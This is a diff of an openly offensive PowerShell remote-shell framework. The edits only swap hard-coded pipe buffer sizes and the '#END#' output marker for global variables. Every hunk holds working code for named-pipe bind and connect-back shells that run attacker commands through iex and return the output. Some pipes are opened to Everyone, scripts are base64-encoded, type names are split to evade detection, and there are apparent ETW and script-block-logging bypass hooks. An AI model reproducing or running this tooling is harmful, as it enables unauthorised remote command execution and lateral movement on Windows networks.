@@ -994,8 +994,8 @@ exit
 					
 					$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
 					
-					if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
-					else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+					if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+					else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
 	
 					$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 			
@@ -1063,8 +1063,8 @@ exit
 				$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
 				
 				if($global:localadminaccesspayload -eq 'PSRemoting'){
-					if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
-					else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+					if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+					else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
 			
 					$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 					
@@ -1080,8 +1080,8 @@ exit
 				}
 				
 				elseif($global:localadminaccesspayload -eq 'SMB'){					
-					if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
-					else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+					if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+					else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
 			
 					$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 					
@@ -1388,11 +1388,11 @@ function New-StealthScript {
 	if (-not $IsServer) {
 		# CLIENT: target connects back to attacker's named pipe server
 		$pipeSetup = "`$$vT='System.IO.Pipes.NamedPipeCl'+'ientStream';`$$v1=New-Object -TypeName `$$vT -ArgumentList '$ComputerName','$PipeName',[System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None;`$$v2=New-Object IO.StreamReader(`$$v1);`$$v3=New-Object IO.StreamWriter(`$$v1);`$$v1.Connect(600000);`$$v3.WriteLine(`"`$([Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)`");`$$v3.Flush()"
-		$loop = "while(`$true){`$$v4=`$$v2.ReadLine();if(`$$v4-eq 'exit'){break};try{`$$v5=& ([scriptblock]::Create(`$$v4)) 2>&1|Out-String;`$$v5-split([char]10)|%{`$$v3.WriteLine(`$_.TrimEnd())}}catch{`$$vb=`$_.Exception.Message;`$$vb-split([char]10)|%{`$$v3.WriteLine(`$_)}};`$$v3.WriteLine('#END#');`$$v3.Flush()};`$$v1.Close();`$$v1.Dispose()"
+		$loop = "while(`$true){`$$v4=`$$v2.ReadLine();if(`$$v4-eq 'exit'){break};try{`$$v5=& ([scriptblock]::Create(`$$v4)) 2>&1|Out-String;`$$v5-split([char]10)|%{`$$v3.WriteLine(`$_.TrimEnd())}}catch{`$$vb=`$_.Exception.Message;`$$vb-split([char]10)|%{`$$v3.WriteLine(`$_)}};`$$v3.WriteLine('$($global:EndMarker)');`$$v3.Flush()};`$$v1.Close();`$$v1.Dispose()"
 	} else {
 		# SERVER: target hosts the pipe, attacker connects in (GListener / Detached mode)
-		$pipeSetup = "`$$v6=New-Object System.IO.Pipes.PipeSecurity;`$$v7=New-Object System.Security.Principal.SecurityIdentifier '$SID';`$$v8=New-Object System.IO.Pipes.PipeAccessRule(`$$v7,'FullControl','Allow');`$$v6.AddAccessRule(`$$v8);`$$vT='System.IO.Pipes.NamedPipeSer'+'verStream';`$$v1=New-Object -TypeName `$$vT -ArgumentList '$PipeName',[System.IO.Pipes.PipeDirection]::InOut,1,[System.IO.Pipes.PipeTransmissionMode]::Byte,[System.IO.Pipes.PipeOptions]::None,1028,1028,`$$v6;`$$v9={param(`$$vcb);`$$vcb.Close()};`$$va=New-Object System.Threading.Timer(`$$v9,`$$v1,600000,[System.Threading.Timeout]::Infinite);`$$v1.WaitForConnection();`$$va.Change([System.Threading.Timeout]::Infinite,[System.Threading.Timeout]::Infinite);`$$va.Dispose();`$$v2=New-Object IO.StreamReader(`$$v1);`$$v3=New-Object IO.StreamWriter(`$$v1)"
-		$loop = "while(`$true){if(-not `$$v1.IsConnected){break};`$$v4=`$$v2.ReadLine();if(`$$v4-eq 'exit'){break}else{try{`$$v5=& ([scriptblock]::Create(`$$v4)) 2>&1|Out-String;`$$v5-split([char]10)|%{`$$v3.WriteLine(`$_.TrimEnd())}}catch{`$$vb=`$_.Exception.Message;`$$vb-split([char]10)|%{`$$v3.WriteLine(`$_)}};`$$v3.WriteLine('#END#');`$$v3.Flush()}};`$$v1.Disconnect();`$$v1.Dispose()"
+		$pipeSetup = "`$$v6=New-Object System.IO.Pipes.PipeSecurity;`$$v7=New-Object System.Security.Principal.SecurityIdentifier '$SID';`$$v8=New-Object System.IO.Pipes.PipeAccessRule(`$$v7,'FullControl','Allow');`$$v6.AddAccessRule(`$$v8);`$$vT='System.IO.Pipes.NamedPipeSer'+'verStream';`$$v1=New-Object -TypeName `$$vT -ArgumentList '$PipeName',[System.IO.Pipes.PipeDirection]::InOut,1,[System.IO.Pipes.PipeTransmissionMode]::Byte,[System.IO.Pipes.PipeOptions]::None,$($global:BufferSize),$($global:BufferSize),`$$v6;`$$v9={param(`$$vcb);`$$vcb.Close()};`$$va=New-Object System.Threading.Timer(`$$v9,`$$v1,600000,[System.Threading.Timeout]::Infinite);`$$v1.WaitForConnection();`$$va.Change([System.Threading.Timeout]::Infinite,[System.Threading.Timeout]::Infinite);`$$va.Dispose();`$$v2=New-Object IO.StreamReader(`$$v1);`$$v3=New-Object IO.StreamWriter(`$$v1)"
+		$loop = "while(`$true){if(-not `$$v1.IsConnected){break};`$$v4=`$$v2.ReadLine();if(`$$v4-eq 'exit'){break}else{try{`$$v5=& ([scriptblock]::Create(`$$v4)) 2>&1|Out-String;`$$v5-split([char]10)|%{`$$v3.WriteLine(`$_.TrimEnd())}}catch{`$$vb=`$_.Exception.Message;`$$vb-split([char]10)|%{`$$v3.WriteLine(`$_)}};`$$v3.WriteLine('$($global:EndMarker)');`$$v3.Flush()}};`$$v1.Disconnect();`$$v1.Dispose()"
 	}
 
 	$rawScript = "$asmLoad;$etw;$sbl;$jitter;$pipeSetup;$loop"
@@ -1431,9 +1431,9 @@ function Start-Listener {
 	
 	$ComputerName = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
 
-	$ClientScript="`$p=New-Object System.IO.Pipes.NamedPipeClientStream('$ComputerName','$PipeName','InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq 'exit'){break};try{`$result=iex ""`$c 2>&1 | Out-String"";`$result-split '`n'|%{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split '`r?`n'|%{`$w.WriteLine(`$_)}};`$w.WriteLine('#END#');`$w.Flush()}`$p.Close();`$p.Dispose()"
+	$ClientScript="`$p=New-Object System.IO.Pipes.NamedPipeClientStream('$ComputerName','$PipeName','InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq 'exit'){break};try{`$result=iex ""`$c 2>&1 | Out-String"";`$result-split '`n'|%{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split '`r?`n'|%{`$w.WriteLine(`$_)}};`$w.WriteLine('$($global:EndMarker)');`$w.Flush()}`$p.Close();`$p.Dispose()"
 	
-	$RawClientScript = "`$p=New-Object System.IO.Pipes.NamedPipeClientStream(""$ComputerName"",""$PipeName"",'InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq ""exit""){break};try{`$result=iex ""`$c 2>&1 | Out-String"";`$result-split ""`u{000A}""|ForEach-Object{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split ""`u{000D}`u{000A}""|ForEach-Object{`$w.WriteLine(`$_)}};`$w.WriteLine(""#END#"");`$w.Flush()}`$p.Close();`$p.Dispose()"
+	$RawClientScript = "`$p=New-Object System.IO.Pipes.NamedPipeClientStream(""$ComputerName"",""$PipeName"",'InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq ""exit""){break};try{`$result=iex ""`$c 2>&1 | Out-String"";`$result-split ""`u{000A}""|ForEach-Object{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split ""`u{000D}`u{000A}""|ForEach-Object{`$w.WriteLine(`$_)}};`$w.WriteLine(""$($global:EndMarker)"");`$w.Flush()}`$p.Close();`$p.Dispose()"
 	
 	$PwshRawClientScript = $RawClientScript
 	
@@ -1459,7 +1459,7 @@ while (`$true) {
 		`$errorMessage = `$_.Exception.Message
 		`$errorMessage -split "`r?`n" | ForEach-Object {`$sw.WriteLine(`$_)}
 	}
-	`$sw.WriteLine("#END#")
+	`$sw.WriteLine("$($global:EndMarker)")
 	`$sw.Flush()
 }
 `$pipeClient.Close()
@@ -1535,7 +1535,7 @@ while (`$true) {
 	$accessRule = New-Object System.IO.Pipes.PipeAccessRule($everyone, "FullControl", "Allow")
 	$securityDescriptor.AddAccessRule($accessRule)
 
-	$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, 'InOut', 1, 'Byte', 'None', 1028, 1028, $securityDescriptor)
+	$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, 'InOut', 1, 'Byte', 'None', $global:BufferSize, $global:BufferSize, $securityDescriptor)
 	
 	$psScript = "Start-Sleep -Seconds 30; `$dummyPipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(`".`", `"$pipeName`", 'InOut'); `$dummyPipeClient.Connect(); `$sw = New-Object System.IO.StreamWriter(`$dummyPipeClient); `$sw.WriteLine(`"dummyhostdropconnection,`$(Get-Location)`"); `$sw.Flush(); `$dummyPipeClient.Close()"
 	
@@ -1609,14 +1609,14 @@ function Print-MultiListener {
 	$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
 	
 	if($global:Detach){
-		$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose()"
+		$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose()"
 	
-		$RawServerScript="`$sD=New-Object System.IO.Pipes.PipeSecurity;`$sU=New-Object System.Security.Principal.SecurityIdentifier ""S-1-1-0"";`$aR=New-Object System.IO.Pipes.PipeAccessRule(`$sU,""FullControl"",""Allow"");`$sD.AddAccessRule(`$aR);`$pS=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sD);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$pS);`$sw=New-Object System.IO.StreamWriter(`$pS);while(`$true){if(-not `$pS.IsConnected){break};`$cmd=`$sr.ReadLine();if(`$cmd-eq""exit""){break}else{try{`$res=iex ""`$cmd 2>&1 | Out-String"";`$res -split ""`u{000A}"" | % {`$sw.WriteLine(`$_.TrimEnd())}}catch{`$err=`$_.Exception.Message;`$err-split""`u{000D}`u{000A}"" | % {`$sw.WriteLine(`$_)}};`$sw.WriteLine(""#END#"");`$sw.Flush()}};`$pS.Disconnect();`$pS.Dispose()"
